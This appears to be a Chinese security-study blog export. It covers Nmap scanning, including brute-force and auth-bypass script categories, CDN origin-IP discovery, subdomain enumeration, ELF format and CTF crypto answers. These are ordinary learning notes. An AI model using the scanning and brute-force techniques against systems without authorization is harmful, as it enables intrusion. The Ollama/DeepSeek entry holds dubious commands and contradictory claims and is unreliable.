title="端口扫描工具NMap（Network Mapper）"></a>端口扫描工具NMap（Network Mapper）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://nmap.org/">Nmap：网络映射器 - 免费的安全扫描程序</a></p><p>图形界面：zenmap</p><p>主要功能<br>1）扫描主机(Host Discovery)<br>2）扫描端口(Port Scanning)<br>3）探测操作系统、软件版本 (Operating System Detection、Version Detection)</p><h2 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h2><p><a href="https://nmap.org/book/man.html">第 15 章.Nmap 参考指南 |Nmap 网络扫描</a></p><p>nmap –help</p><p>TARGET SPECIFICATION:目标，对什么进行扫描，比如是域名、IP或者网络<br>HOST DISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部扫一遍，或者用<br>相应的协议扫<br>SCAN TECHNIQUES:扫描技术，协议的设置<br>PORT SPECIFICATION AND SCAN ORDER:端口和扫描顺序设置<br>SERVICE&#x2F;VERSION DETECTION:服务和版本识别<br>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p><p>【nmap本身内置了大量的lua脚本，而且还可以自己编写脚本<br>ls &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; | wc -l<br>全部清单：<a href="https://nmap.org/nsedoc/index.html">https://nmap.org/nsedoc/index.html</a><br>例如：<br>nmap 192.168.142.137 –script http-enum 列举HTTP服务<br>nmap –script&#x3D;auth 绕过鉴权<br>nmap –script&#x3D;brute 暴力破解<br>nmap –script&#x3D;vuln 扫描漏洞】</p><p>OS DETECTION:操作系统识别<br>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等<br>FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理，假IP等<br>OUTPUT:把扫描接出输出到文件<br>MISC: 杂项：启用IPv6等等配置参数示例</p><h2 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h2><p>nmap 192.168.142.133 # metasploitable2 Linux</p><p><a href="http://testfire.net/">http://testfire.net/</a></p><p>nmap testfire.net           # IBM的一个靶场<br>简单扫描：nmap -sP 192.168.142.133<br>指定端口或范围扫描： nmap -p0-65535 192.168.142.133<br>探测操作系统： nmap -O 192.168.142.133</p><p>【cat &#x2F;proc&#x2F;version】</p><p>只进行主机发现，不进行端口扫描： nmap -sn 192.168.40.195&#x2F;24</p><h6 id="IP后面的-24是什么意思？"><a href="#IP后面的-24是什么意思？" class="headerlink" title="IP后面的&#x2F;24是什么意思？"></a>IP后面的&#x2F;24是什么意思？</h6><p>&#x2F;24含义: IP地址后的&#x2F;24表示子网掩码的位数为24位，即255.255.255.0，属于C类IP地址。</p><p>掩码的位数。<br>子网掩码8位，11111111.00000000.00000000.00000000 代表：255.0.0.0（A类IP地址）<br>子网掩码16位，11111111.11111111.00000000.00000000 代表：255.255.0.0（B类IP地址）<br>子网掩码24位，11111111.11111111.11111111.00000000 代表：255.255.255.0（C类IP地址）<br>旁站：和目标网站在同一台服务器但端口不同的其他网站。<br>C段 ：和目标服务器IP处在同一个C段的其它服务器。</p><h2 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h2><p>第一种：Intense scan<br>第二种：Intense scan plus UDP<br>第三种：Intense scan,all TCP ports<br>第四种：Intense scan,no ping<br>第五种：Ping scan<br>第六种：Quick scan<br>第七种：Quick scan plus<br>第八种：Quick traceroute<br>第九种：Regular scan<br>第十种：Slow comprehensive scan</p><h1 id="其他扫描工具"><a href="#其他扫描工具" class="headerlink" title="其他扫描工具"></a>其他扫描工具</h1><p>masscan、nbtscan<br><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson</a></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/17f7e2087847.html"/>
      <url>/2025/06/17f7e2087847.html</url>
      
        <content type="html"><![CDATA[<p>title: IP信息<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="DNS服务器的类型"><a href="#DNS服务器的类型" class="headerlink" title="DNS服务器的类型"></a>DNS服务器的类型</h1><ul><li>本地域名服务器: 在网络适配器中配置的服务器地址，如114.114.114.114或8.8.8.8，可能是路由器地址。</li><li>根域名服务器: 负责全球域名的解析，如.com、.net等顶级域名的管理。</li><li>顶级域名服务器: 解析我们注册的一级域名（实际上是二级域名，因为.com等才是一级域名）。</li><li>授权域名服务器: 解析三级域名（实际上是四级域名），如blog.wuya.com，知道配置记录指向的IP。</li></ul><h2 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h2><ul><li>迭代查询: 本地域名服务器依次查询根域名服务器、顶级域名服务器、授权域名服务器。</li><li>递归查询: 本地域名服务器帮助查询，层层返回结果。</li></ul><p><img src="/./../../../images/image-20250629130717006.png" alt="image-20250629130717006"></p><h1 id="ping-nslookup"><a href="#ping-nslookup" class="headerlink" title="ping &#x2F; nslookup"></a>ping &#x2F; nslookup</h1><h2 id="Packet-Internet-Groper（因特网包探索器）："><a href="#Packet-Internet-Groper（因特网包探索器）：" class="headerlink" title="Packet Internet Groper（因特网包探索器）："></a>Packet Internet Groper（因特网包探索器）：</h2><p>用于检测网络通畅性，也可根据域名获得服务器IP。</p><h2 id="nslookup工具"><a href="#nslookup工具" class="headerlink" title="nslookup工具:"></a>nslookup工具:</h2><p>也可用于查询域名对应的IP，可指定查询类型，如MX记录（邮件交换记录）。</p><p>nslookup -type&#x3D;”MX” baidu.com</p><h1 id="IP归属信息"><a href="#IP归属信息" class="headerlink" title="IP归属信息"></a>IP归属信息</h1><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><p><a href="https://www.ip38.com/">iP地址查询 - iP38查询网</a></p><p>进行IP归属查询，可查询IPv4&#x2F;IPv6地址、AS号码、网络名称等信息。</p><p>运营商：显示为”China Mobile Communications Corporation”，即中国移动</p><p>IP段范围：</p><p>地理位置：</p><p>管理联系人：</p><h1 id="如何获取CDN背后的真实IP"><a href="#如何获取CDN背后的真实IP" class="headerlink" title="如何获取CDN背后的真实IP"></a>如何获取CDN背后的真实IP</h1><h2 id="CDN-Content-Delivery-Network-内容分发网络"><a href="#CDN-Content-Delivery-Network-内容分发网络" class="headerlink" title="CDN(Content Delivery Network)内容分发网络"></a>CDN(Content Delivery Network)内容分发网络</h2><h4 id="使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。"><a href="#使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。" class="headerlink" title="使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。"></a>使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。</h4><p>优势：</p><ul><li>负载均衡：分摊访问请求，减少单台服务器压力</li><li>加速访问：用户访问最近的节点服务器，缩短物理距离，提升响应速度（如武汉用户访问武汉服务器比北京服务器更快）</li><li>应用案例：淘宝早期就采用CDN技术处理商品图片等静态内容</li></ul><h2 id="实现流程（以阿里云为例）"><a href="#实现流程（以阿里云为例）" class="headerlink" title="实现流程（以阿里云为例）"></a>实现流程（以阿里云为例）</h2><p><a href="https://www.zhihu.com/question/36514327/answer/1604554133">https://www.zhihu.com/question/36514327/answer/1604554133</a></p><ol><li>当终端用户（北京）向<a href="http://www.a.com下的指定资源发起请求时,首先/">www.a.com下的指定资源发起请求时，首先</a><br>向LDNS（本地DNS）发起域名解析请求。</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直/">www.a.com的IP地址记录。如果有，则直</a><br>接返回给终端用户；如果没有，则向授权DNS查询。</li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a><br><a href="http://www.a.tbcdn.com对应ip地址./">www.a.tbcdn.com对应IP地址。</a></li><li>域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点<br>IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ol><h2 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h2><p><img src="/./../../../images/image-20250629133105891.png" alt="image-20250629133105891"></p><p>CDN会隐藏真实服务器IP，需要通过特殊技术手段获取</p><h3 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h3><h3 id="2、历史DNS"><a href="#2、历史DNS" class="headerlink" title="2、历史DNS"></a>2、历史DNS</h3><p><a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><h3 id="3、通过子域名查询IP"><a href="#3、通过子域名查询IP" class="headerlink" title="3、通过子域名查询IP"></a>3、通过子域名查询IP</h3><h3 id="4、国外主机解析"><a href="#4、国外主机解析" class="headerlink" title="4、国外主机解析"></a>4、国外主机解析</h3><p>原理：部分网站未部署海外CDN节点，国外访问可能直连源站</p><p>工具：</p><ul><li><a href="https://www.webpagetest.org/">WebPageTest - 网站性能和优化测试</a></li><li><a href="https://dnscheck.pingdom.com/">网站速度测试 |Pingdom 工具</a></li><li><a href="https://www.host-tracker.com/en">网站正常运行时间监控服务，检查网站是否关闭 - Host-tracker</a></li></ul><h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>域名信息收集</title>
      <link href="/2025/06/a2f5477bcf25.html"/>
      <url>/2025/06/a2f5477bcf25.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-域名是什么"><a href="#1-域名是什么" class="headerlink" title="1.域名是什么?"></a>1.域名是什么?</h1><p>用来代替IP，找到网络上的一台计算机</p><p><img src="/./../../../images/image-20250628152826187.png" alt="image-20250628152826187"></p><h1 id="2-域名的分类："><a href="#2-域名的分类：" class="headerlink" title="2.域名的分类："></a>2.域名的分类：</h1><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名:"></a>国际域名:</h3><p>.com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名:"></a>国别域名:</h3><p>.CN代表中国，.UK代表英国，.US代表美国</p><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名:"></a>新顶级域名:</h3><p>biz,info，name，pro，aero,coop, museum..</p><h1 id="3-域名联系人信息"><a href="#3-域名联系人信息" class="headerlink" title="3.域名联系人信息"></a>3.域名联系人信息</h1><p>所属人、邮箱、电话、地址…..</p><p><a href="https://site.ip138.com/dbcha.com/domain.htm">dbcha.com子域名大全 dbcha.com二级域名 dbcha.com域名解析查询</a></p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>.com由域名运营商VeriSign 管理</p><p>cn域名由CNNIC 管理</p><h4 id="whois工具"><a href="#whois工具" class="headerlink" title="whois工具"></a>whois工具</h4><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a><br><a href="http://whoissoft.com/">http://whoissoft.com</a><br><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a><br>kali whois命令</p><p><img src="/./../../../images/image-20250629091525995.png" alt="image-20250629091525995"></p><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><p><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></p><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><p>官方渠道：beian.miit.gov.cn</p><p>工具：天眼查、企查查等</p><p>查询方式：输入单位名称&#x2F;域名&#x2F;备案号</p><p>备案号规则：个人唯一，多个网站使用”-1”,”-2”等后缀</p><h1 id="4-子域名信息"><a href="#4-子域名信息" class="headerlink" title="4.子域名信息"></a>4.子域名信息</h1><h3 id="子域名的作用"><a href="#子域名的作用" class="headerlink" title="子域名的作用"></a>子域名的作用</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>子域名是主域名下的二级域名，格式为”子域名.主域名”，如news.baidu.com</p><h4 id="作用原理："><a href="#作用原理：" class="headerlink" title="作用原理："></a>作用原理：</h4><p>·资源隔离：可将不同服务部署在不同服务器（如news.baidu.com和map.baidu.com指向不同IP）</p><p>·品牌统一：保持同一品牌下的多产品线（如百度新闻、百度地图）</p><p>·零成本扩展：无需额外注册新域名，理论上子域名数量无限制</p><h4 id="对比方案："><a href="#对比方案：" class="headerlink" title="对比方案："></a>对比方案：</h4><p>·子目录方案：如<a href="http://www.baidu.com/news%EF%BC%88%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%EF%BC%8C%E6%80%A7%E8%83%BD%E5%8F%97%E9%99%90%EF%BC%89">www.baidu.com/news（所有服务共享服务器资源，性能受限）</a></p><p>·独立域名方案：如bdnews.com（注册管理成本高）</p><h3 id="怎么查询子域名？"><a href="#怎么查询子域名？" class="headerlink" title="怎么查询子域名？"></a>怎么查询子域名？</h3><h4 id="1、字典猜解："><a href="#1、字典猜解：" class="headerlink" title="1、字典猜解："></a>1、字典猜解：</h4><p>使用常见子名字典（如oa、crm、bbs等前缀）</p><h4 id="2、暴力枚举："><a href="#2、暴力枚举：" class="headerlink" title="2、暴力枚举："></a>2、暴力枚举：</h4><p>从a-z、0-9组合尝试（1位→多位）</p><h4 id="3、技术实现："><a href="#3、技术实现：" class="headerlink" title="3、技术实现："></a>3、技术实现：</h4><p>·端口探测：默认扫描80(http)和443(https)端口</p><p>·状态检测：通过HTTP响应码判断服务可用性（200&#x2F;302为有效）</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h1 id="5-域名DNS信息"><a href="#5-域名DNS信息" class="headerlink" title="5.域名DNS信息"></a>5.域名DNS信息</h1><h3 id="1-域名与IP"><a href="#1-域名与IP" class="headerlink" title="1. 域名与IP"></a>1. 域名与IP</h3><h4 id="DNS本质："><a href="#DNS本质：" class="headerlink" title="DNS本质："></a>DNS本质：</h4><p>DNS(Domain Name Server)是将域名映射为IP地址的解析服务，本质是一个记录域名与IP映射关系的分布式数据库。</p><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><p>当用户访问域名时，DNS服务会查询其数据库中的映射表，将域名转换为对应的IP地址。</p><h3 id="2-域名解析信息"><a href="#2-域名解析信息" class="headerlink" title="2. 域名解析信息"></a>2. 域名解析信息</h3><h4 id="配置流程："><a href="#配置流程：" class="headerlink" title="配置流程："></a>配置流程：</h4><p>在域名注册商处设置DNS服务器（如DNSPod）</p><p>在DNS服务平台配置具体解析规则</p><p><img src="/./../../../images/image-20250629100748277.png" alt="image-20250629100748277"></p><h4 id="配置示例："><a href="#配置示例：" class="headerlink" title="配置示例："></a>配置示例：</h4><p>@符号代表所有地址</p><p>www代表特定子域名</p><p>一个域名可配置多条不同类型记录</p><h4 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h4><p>A记录：是最常用类型，将域名指向一个IPv4地址，如8.8.8.8<br>CNAME：别名记录，将域名指向另一个域名地址，与其保持相同解析(如z.cn跳转到amazon.cn)</p><p>MX：用于邮件服务器，相关参数一般由邮件注册商提供，企业邮箱服务(如腾讯企业邮mxdomain.qq.com）</p><p>TXT：可填写附加文本信息，常用于域名验证<br>NS(name serve)：域名服务器记录，可将指定域名交由其他DNS服务商解析管理(如f1g1ns1.dnspod.net)</p><p>AAAA：将域名指向一个IPv6地址(如ff06:0:0:0:0:0:0:c3)</p><p><a href="https://www.strerr.com/cn/nslookup.html">DNS域名在线查询 - www.strerr.com</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><p><a href="http://www.jsons.cn/nslookup/">在线域名解析记录检测-在线Nslookup域名解析查询工具</a></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件格式</title>
      <link href="/2025/06/d6d094e5785a.html"/>
      <url>/2025/06/d6d094e5785a.html</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h1><p>1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也称为程序。</p><p>2.可重定位文件（Relocatable File）（可重定位目标文件）[.rel]:由源代码编译生成，包含编译后的二进制代码和数据，但未完成链接过程，通常以”.o”作为扩展名。</p><p>3.共享目标文件（Shared Object file）[.dyn]:动态链接库文件。可被多个程序共享使用，在运行时加载到内存。</p><h1 id="ELF-文件结构"><a href="#ELF-文件结构" class="headerlink" title="ELF 文件结构"></a>ELF 文件结构</h1><p>ELF 文件通过特定的格式组织数据，主要结构包括：</p><h4 id="1-ELF-文件头（ELF-Header）"><a href="#1-ELF-文件头（ELF-Header）" class="headerlink" title="1. ELF 文件头（ELF Header）"></a><strong>1. ELF 文件头（ELF Header）</strong></h4><ul><li>位于文件起始位置，描述文件的基本属性。</li><li>关键字段：<ul><li><strong>EI_MAGIC</strong>：文件魔数（如<code>0x7F ELF</code>），用于标识 ELF 格式。[7f 45 4c 46即字符串“\177ELF“]</li><li><strong>EI_CLASS</strong>：位数（32 位或 64 位）。</li><li><strong>EI_DATA</strong>：字节序（大端或小端）。</li><li><strong>e_type</strong>：文件类型（可执行文件、共享库等）。</li><li><strong>e_entry</strong>：程序入口地址。</li></ul></li></ul><h4 id="2-程序头表-段表（Program-Header-Table）"><a href="#2-程序头表-段表（Program-Header-Table）" class="headerlink" title="2. 程序头表&#x2F;段表（Program Header Table）"></a><strong>2. 程序头表&#x2F;段表（Program Header Table）</strong></h4><ul><li>描述文件在内存中的布局，用于加载器将文件映射到内存。</li><li>关键字段：<ul><li><strong>p_type</strong>：段类型（如代码段、数据段、动态链接段）。</li><li><strong>p_vaddr</strong>：内存虚拟地址。</li><li><strong>p_filesz</strong>：文件中占用的大小。</li><li><strong>p_memsz</strong>：内存中占用的大小。</li></ul></li></ul><h4 id="3-节头表（Section-Header-Table）"><a href="#3-节头表（Section-Header-Table）" class="headerlink" title="3. 节头表（Section Header Table）"></a><strong>3. 节头表（Section Header Table）</strong></h4><ul><li>描述文件中的各个 “节”（Section），用于链接器处理目标文件。</li><li>常见节类型：<ul><li><strong>.text</strong>：可执行代码段。</li><li><strong>.data</strong>：已初始化的全局变量和静态变量。</li><li><strong>.bss</strong>：未初始化的全局变量和静态变量（运行时自动初始化为 0）。</li><li><strong>.rodata</strong>：只读数据段（如字符串常量）。</li><li><strong>.symtab</strong>：符号表，记录函数和变量的名称、地址等。</li><li><strong>.strtab</strong>：字符串表，存储符号表中的字符串内容。</li></ul></li></ul><h4 id="4-节（Sections）"><a href="#4-节（Sections）" class="headerlink" title="4. 节（Sections）"></a><strong>4. 节（Sections）</strong></h4><ul><li>具体存储代码、数据、元信息的区域，不同类型的 ELF 文件包含的节不同。</li><li>示例：<ul><li>可执行文件：包含<code>.text</code>、<code>.data</code>、<code>.dynamic</code>（动态链接信息）等。</li><li>目标文件：包含<code>.text</code>、<code>.rel.text</code>（代码重定位信息）等。</li></ul></li></ul><p><img src="/./../../../../../images/image-20250629223418086.png" alt="image-20250629223418086"></p><p><img src="/./../../../../../images/image-20250629223515561.png" alt="image-20250629223515561"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 2-ELF文件格式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/a0cca283eeaf.html"/>
      <url>/2025/06/a0cca283eeaf.html</url>
      
        <content type="html"><![CDATA[<p>title: 信息收集概览<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h1><h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><h3 id="信息收集包括内容"><a href="#信息收集包括内容" class="headerlink" title="信息收集包括内容"></a>信息收集包括内容</h3><h3 id="收集范围："><a href="#收集范围：" class="headerlink" title="收集范围："></a>收集范围：</h3><p>域名信息、IP段、开放的端口、网站架构、文件目录结构、软件版本、WAF、旁站、C段…</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>1.域名相关信息</p><p>2.IP相关信息</p><p>3.端口服务相关信息</p><p>4.指纹识别（CMS&#x2F;CDF&#x2F;WAF）</p><p>5.Google Hacking</p><p>6.目录信息</p><p>7.Git Hack</p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r1_8b</title>
      <link href="/2025/06/38d795f72413.html"/>
      <url>/2025/06/38d795f72413.html</url>
      
        <content type="html"><![CDATA[<p>系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:\ollama\models</p><p><img src="/images/254E7FA0-46F1-4144-B913-C7C3E82AFEBA.png"></p><p><img src="/images/E5D4D6BF-5C2F-450B-BF73-B2076752FB89.png"></p><ol><li>拉取模型</li></ol><blockquote><p>ollama pull deepseek-r1:8b</p></blockquote><ol start="2"><li>运行模型</li></ol><blockquote><p>ollama run deepseek-r1:8b</p></blockquote><h3 id="🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama"><a href="#🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama" class="headerlink" title="🔍 Can I run DeepSeek-R1:8B via Ollama?"></a>🔍 Can I run DeepSeek-R1:8B via Ollama?</h3><p>Currently, <strong>Ollama does not officially support the DeepSeek-R1 8B model</strong> unless it has been added to their<br>repository or community-supported list. You should check:</p><ul><li>The <a href="https://ollama.com/models">Ollama models page</a> for updates.</li><li>Community forums (e.g., GitHub issues) if users have shared custom Docker images&#x2F;definitions.</li></ul><hr><h3 id="🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama"><a href="#🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama" class="headerlink" title="🧪 How to run transformer models like DeepSeek-R1 via Ollama"></a>🧪 How to run transformer models like DeepSeek-R1 via Ollama</h3><p>If the model is supported, you can use this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>This will:</p><ul><li>Download (if not installed) and load the 8B parameter version of DeepSeek-R1.</li><li>Start a local instance for interactive chat or API access.</li></ul><hr><h3 id="🤔-What-is-DeepSeek-R1-8B"><a href="#🤔-What-is-DeepSeek-R1-8B" class="headerlink" title="🤔 What is DeepSeek-R1:8B?"></a>🤔 What is DeepSeek-R1:8B?</h3><p>DeepSeek-R1 is an advanced transformer language model developed by <a href="https://www.deepseek.com/">深度求索（DeepSeek）</a>. The “8B” refers to <strong>8 billion parameters</strong> in the model. It’s designed for:</p><ul><li>Natural language understanding and generation.</li><li>Code-related tasks (syntax, debugging).</li><li>Knowledge answering.</li><li>Creative writing.</li></ul><hr><h3 id="📄-Example-usage-with-Ollama-CLI"><a href="#📄-Example-usage-with-Ollama-CLI" class="headerlink" title="📄 Example usage with Ollama CLI"></a>📄 Example usage with Ollama CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start interactive chat (if supported)</span></span><br><span class="line">ollama chat deepseek-r1:8b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or generate text via API/command line:</span></span><br><span class="line">curl http://localhost:11434/api/generate \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;deepseek-r1:8b&quot;,</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Explain quantum computing in simple terms.&quot;,</span></span><br><span class="line"><span class="string">    &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="⚠️-If-the-model-isn’t-supported-yet"><a href="#⚠️-If-the-model-isn’t-supported-yet" class="headerlink" title="⚠️ If the model isn’t supported yet:"></a>⚠️ If the model isn’t supported yet:</h3><p>You can try running it via Docker (if you have technical access):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name deepseek-r1 \</span><br><span class="line">  -p 11434:11434 \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  -v ollama_models:/models \</span><br><span class="line">  llamafile/docker-ollama \</span><br><span class="line">  predict DeepSeek-R1 /models/deepseek-r1.tar</span><br></pre></td></tr></table></figure><p>But note: This may not be officially maintained.</p><hr><h3 id="🌟-What-else-can-Ollama-run"><a href="#🌟-What-else-can-Ollama-run" class="headerlink" title="🌟 What else can Ollama run?"></a>🌟 What else can Ollama run?</h3><p>Oll (a) supports models like:</p><ul><li>Llama, Mistral, Mixtral</li><li>GPT models (via LMSYS)</li><li>Gemma, Phi, CodeLlama</li><li>And many others!</li></ul><p>Check the <a href="https://ollama.com/models">current list on their website</a>.</p><hr><p>Let me know if you’d like help with a specific task using DeepSeek-R1 or another model! 😊</p>]]></content>
      
      
      <categories>
          
          <category> Deepseek </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩斯电码</title>
      <link href="/2025/06/828dca5ddec2.html"/>
      <url>/2025/06/828dca5ddec2.html</url>
      
        <content type="html"><![CDATA[<p>…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —<br>hello_crypto<br>TZCFlag{HELLO_CRYPTO}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩丝</title>
      <link href="/2025/06/21db97fd724d.html"/>
      <url>/2025/06/21db97fd724d.html</url>
      
        <content type="html"><![CDATA[<p>.. .-.. — …- . -.– — ..-<br>iloveyou</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/358bdb20a0d3.html"/>
      <url>/2025/06/358bdb20a0d3.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>password</title>
      <link href="/2025/06/fbf475443deb.html"/>
      <url>/2025/06/fbf475443deb.html</url>
      
        <content type="html"><![CDATA[<p>姓名：张三<br>生日：19900315<br>key格式为key{xxxxxxxxxx}</p><p>发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：<br>flag{zs19900315}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dancemen</title>
      <link href="/2025/06/cbb71a3305da.html"/>
      <url>/2025/06/cbb71a3305da.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/dancemen.jpg"><br><img src="/images/Pastedimage20250603124314.png"><br>TZCFlag{dancemenareinteresting}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rabbit 1</title>
      <link href="/2025/06/bf8f92268b07.html"/>
      <url>/2025/06/bf8f92268b07.html</url>
      
